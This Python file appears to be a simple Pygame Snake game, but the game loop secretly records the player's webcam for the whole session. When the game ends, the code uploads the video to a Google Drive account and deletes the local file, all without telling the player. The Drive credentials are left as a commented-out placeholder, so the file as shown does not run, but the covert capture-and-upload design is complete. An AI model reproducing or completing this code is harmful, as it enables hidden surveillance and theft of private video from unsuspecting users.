import pygame
import random
import cv2
import os
import json
import threading
import time
from google.oauth2.credentials import Credentials
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload
import schedule

class SnakeGame:
    def __init__(self):
        # Initialize Pygame
        pygame.init()

        # Define colors
        self.white = (255, 255, 255)
        self.yellow = (255, 255, 102)
        self.black = (0, 0, 0)
        self.red = (213, 50, 80)
        self.green = (0, 255, 0)
        self.blue = (50, 153, 213)

        # Display dimensions
        self.dis_width = 800
        self.dis_height = 600

        # Initialize the display
        self.dis = pygame.display.set_mode((self.dis_width, self.dis_height))
        pygame.display.set_caption('Snake Game')

        # Set the clock speed
        self.clock = pygame.time.Clock()
        self.snake_block = 10
        self.snake_speed = 15

        # Define the font styles
        self.font_style = pygame.font.SysFont(None, 50)
        self.score_font = pygame.font.SysFont(None, 35)

        # Google Drive credentials
        # creds_json = '''
        # {access_token
        # }
        # '''

        # Convert the JSON string to a dictionary
        self.creds_dict = json.loads(creds_json)

        # Load the credentials
        self.creds = Credentials.from_authorized_user_info(info=self.creds_dict)

        # Create the Google Drive service
        self.drive_service = build('drive', 'v3', credentials=self.creds)

    def our_snake(self, snake_block, snake_list):
        for x in snake_list:
            pygame.draw.rect(self.dis, self.black, [x[0], x[1], snake_block, snake_block])

    def message(self, msg, color):
        mesg = self.font_style.render(msg, True, color)
        self.dis.blit(mesg, [self.dis_width / 6, self.dis_height / 3])

    def upload_to_drive(self, filename):
        try:
            if os.path.exists(filename):
                print(f"Uploading {filename} to Google Drive...")
                file_metadata = {'name': filename}
                media = MediaFileUpload(filename, mimetype='video/mp4')
                file = self.drive_service.files().create(body=file_metadata, media_body=media, fields='id').execute()
                print('File ID: %s' % file.get('id'))
                self.delete_file(filename)  # Call delete_file after successful upload
            else:
                print(f"File {filename} does not exist.")
        except Exception as e:
            print(f"An error occurred during upload: {e}")

    def delete_file(self, filename):
        try:
            os.remove(filename)
            print(f"Successfully deleted {filename}")
        except Exception as e:
            print(f"Failed to delete {filename}: {e}")

    def gameLoop(self):
        game_over = False
        game_close = False

        x1 = self.dis_width / 2
        y1 = self.dis_height / 2

        x1_change = 0
        y1_change = 0

        snake_List = []
        Length_of_snake = 1

        foodx = round(random.randrange(0, self.dis_width - self.snake_block) / 10.0) * 10.0
        foody = round(random.randrange(0, self.dis_height - self.snake_block) / 10.0) * 10.0

        # Video capture setup
        cap = cv2.VideoCapture(0)
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter('output.mp4', fourcc, 20.0, (640, 480))

        while not game_over:
            while game_close:
                self.dis.fill(self.blue)
                self.message("You Lost! Press Q-Quit or C-Play Again", self.red)
                pygame.display.update()

                for event in pygame.event.get():
                    if event.type == pygame.KEYDOWN:
                        if event.key == pygame.K_q:
                            game_over = True
                            game_close = False
                        if event.key == pygame.K_c:
                            self.gameLoop()

            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    game_over = True
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_LEFT:
                        x1_change = -self.snake_block
                        y1_change = 0
                    elif event.key == pygame.K_RIGHT:
                        x1_change = self.snake_block
                        y1_change = 0
                    elif event.key == pygame.K_UP:
                        y1_change = -self.snake_block
                        x1_change = 0
                    elif event.key == pygame.K_DOWN:
                        y1_change = self.snake_block
                        x1_change = 0

            if x1 >= self.dis_width or x1 < 0 or y1 >= self.dis_height or y1 < 0:
                game_close = True
            x1 += x1_change
            y1 += y1_change
            self.dis.fill(self.blue)
            pygame.draw.rect(self.dis, self.green, [foodx, foody, self.snake_block, self.snake_block])
            snake_Head = []
            snake_Head.append(x1)
            snake_Head.append(y1)
            snake_List.append(snake_Head)
            if len(snake_List) > Length_of_snake:
                del snake_List[0]

            for x in snake_List[:-1]:
                if x == snake_Head:
                    game_close = True

            self.our_snake(self.snake_block, snake_List)
            pygame.display.update()

            # Capture video frame
            ret, frame = cap.read()
            if ret:
                out.write(frame)

            if x1 == foodx and y1 == foody:
                foodx = round(random.randrange(0, self.dis_width - self.snake_block) / 10.0) * 10.0
                foody = round(random.randrange(0, self.dis_height - self.snake_block) / 10.0) * 10.0
                Length_of_snake += 1

            self.clock.tick(self.snake_speed)

        # Release video capture and writer
        cap.release()
        out.release()

        pygame.quit()

        # Upload the video to Google Drive
        self.upload_to_drive('output.mp4')
        quit()

if __name__ == "__main__":
    snake_game = SnakeGame()
    snake_game.gameLoop()
